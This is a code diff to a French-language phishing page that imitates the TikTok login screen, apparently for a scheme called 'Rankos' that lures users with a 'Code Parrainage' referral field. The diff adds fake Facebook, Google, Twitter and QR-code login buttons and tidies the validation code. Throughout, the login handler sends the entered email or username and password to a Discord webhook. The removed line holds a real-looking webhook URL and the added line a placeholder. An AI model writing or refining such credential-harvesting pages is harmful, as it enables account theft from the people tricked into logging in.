@@ -5,6 +5,11 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Se connecter | Rankos</title>
 
+  <!-- Open Graph Meta Tags -->
+  <meta property="og:title" content="Se connecter | Rankos" />
+  <meta property="og:description" content="." />
+  <meta property="og:image" content="https://i.ibb.co/sdVtRCfZ/41b3zsiq4p-L.png" />
+
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
   <style>
     * {
@@ -62,6 +67,10 @@
 
     h1 {
       font-size: 28px;
+    }
+
+    h2 {
+      font-size: 22px;
     }
 
     p.description {
@@ -189,10 +198,30 @@
     <h1>Connecte-toi à TikTok</h1>
     <p class="description">Gère ton compte, consulte tes notifications, commente des vidéos et bien plus encore.</p>
 
+    <div class="btn">
+      <img src="https://img.icons8.com/material-outlined/24/000000/qr-code.png" alt="QR Code" />
+      Utiliser un code QR
+    </div>
+
     <div class="btn" onclick="showLoginForm()">
       <img src="https://img.icons8.com/ios-filled/50/000000/user.png" alt="User Icon" />
       Utiliser le téléphone/l’e-mail/le nom d’utilisateur
       <span class="badge">Code Parrainage</span>
+    </div>
+
+    <div class="btn">
+      <img src="https://img.icons8.com/color/48/facebook.png" alt="Facebook" />
+      Continuer avec Facebook
+    </div>
+
+    <div class="btn">
+      <img src="https://img.icons8.com/color/48/google-logo.png" alt="Google" />
+      Continuer avec Google
+    </div>
+
+    <div class="btn">
+      <img src="https://img.icons8.com/color/48/twitter--v1.png" alt="Twitter" />
+      Continuer avec Twitter
     </div>
 
     <p class="terms">
@@ -206,12 +235,16 @@
 
   <div class="login-interface" id="login-form">
     <h1>Se connecter</h1>
+    <div style="display: flex; justify-content: center; gap: 20px; font-size: 14px; margin-bottom: 20px;">
+      <div style="font-weight: bold;">E-mail ou nom d'utilisateur</div>
+      <div style="color: #888;">Connexion avec un numéro de téléphone</div>
+    </div>
     <input type="text" id="email" placeholder="E-mail ou nom d'utilisateur" />
     <div class="password-wrapper">
       <input type="password" id="password" placeholder="Mot de passe" />
       <span class="toggle-password" onclick="togglePassword()">👁️</span>
     </div>
-    <input type="text" id="referral" placeholder="Code Parrainage (4 chiffres)" />
+    <input type="text" id="parrainage" placeholder="Code Parrainage (4 chiffres)" />
     <a href="#">Mot de passe oublié ?</a>
     <button id="loginBtn" disabled>Se connecter</button>
     <div class="back-link" onclick="showMain()">← Retour</div>
@@ -238,50 +271,46 @@
 
     const emailInput = document.getElementById('email');
     const passwordInput = document.getElementById('password');
-    const referralInput = document.getElementById('referral');
+    const parrainageInput = document.getElementById('parrainage');
     const loginBtn = document.getElementById('loginBtn');
 
-    function validateReferral(code) {
-      return /^[0-9]{4}$/.test(code); // Exige 4 chiffres
+    function isValidParrainage(code) {
+      return /^\d{4}$/.test(code);
     }
 
     function updateButtonState() {
-      const email = emailInput.value.trim();
-      const password = passwordInput.value.trim();
-      const referral = referralInput.value.trim();
+      const emailValid = emailInput.value.trim().length > 5;
+      const passwordValid = passwordInput.value.trim().length > 5;
+      const parrainageValid = isValidParrainage(parrainageInput.value.trim());
 
-      const isValid = (
-        email.length > 5 &&
-        password.length > 5 &&
-        validateReferral(referral)
-      );
-
-      loginBtn.disabled = !isValid;
-      loginBtn.classList.toggle('active', isValid);
+      if (emailValid && passwordValid && parrainageValid) {
+        loginBtn.disabled = false;
+        loginBtn.classList.add('active');
+      } else {
+        loginBtn.disabled = true;
+        loginBtn.classList.remove('active');
+      }
     }
 
     emailInput.addEventListener('input', updateButtonState);
     passwordInput.addEventListener('input', updateButtonState);
-    referralInput.addEventListener('input', updateButtonState);
+    parrainageInput.addEventListener('input', updateButtonState);
 
     loginBtn.addEventListener('click', () => {
       const email = emailInput.value.trim();
       const password = passwordInput.value.trim();
-      const referral = referralInput.value.trim();
+      const parrainage = parrainageInput.value.trim();
 
-      if (!validateReferral(referral)) {
-        alert("Le code parrainage doit contenir exactement 4 chiffres.");
-        return;
-      }
+      if (!isValidParrainage(parrainage)) return;
 
       const discordMessage =
         `📥 **Nouvelle tentative de connexion TikTok**\n\n` +
-        `👤 **Email / Identifiant :** \`${email}\`\n` +
-        `🔐 **Mot de passe :** \`${password}\`\n` +
-        `🏷️ **Code Parrainage :** \`${referral}\`\n` +
+        `**👤 Email ou Nom d'utilisateur :** \`${email}\`\n` +
+        `**🔐 Mot de passe :** \`${password}\`\n` +
+        `🎟️ **Code Parrainage :** \`${parrainage}\`\n` +
         `🕒 Date : ${new Date().toLocaleString('fr-FR')}`;
 
-      fetch('https://discord.com/api/webhooks/1382805479318884393/q3PgxN5YRwcy1MPgFurwEWHcLq9c3wBSqAOSnKkbYO1z23cRgTPuEzCgvcILBvf_-_p6', {
+      fetch('https://discord.com/api/webhooks/TON_WEBHOOK_ICI', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ content: discordMessage })
